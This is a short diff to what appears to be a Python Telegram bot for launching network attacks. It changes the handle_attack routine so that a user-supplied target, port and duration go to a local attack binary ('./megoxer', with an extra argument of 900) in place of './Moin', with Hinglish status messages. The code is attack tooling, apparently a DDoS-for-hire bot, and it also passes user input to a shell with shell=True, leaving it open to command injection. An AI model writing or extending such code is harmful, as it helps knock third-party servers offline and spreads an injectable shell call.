@@ -112,7 +112,7 @@ def handle_attack(message):
     bot.send_message(message.chat.id, f"🚀 **Attack Shuru!**\n🎯 `{target}:{port}`\n⏳ {time_duration}s👇BETA SCREENSHOT BHEJ AB", parse_mode="Markdown")
 
     try:
-        subprocess.run(f"./Moin {target} {port} {time_duration}", shell=True, check=True)
+        subprocess.run(f"./megoxer {target} {port} {time_duration} 900", shell=True, check=True)
     except subprocess.CalledProcessError:
         bot.reply_to(message, "❌ **Attack fail ho gaya!**")
         is_attack_running = False
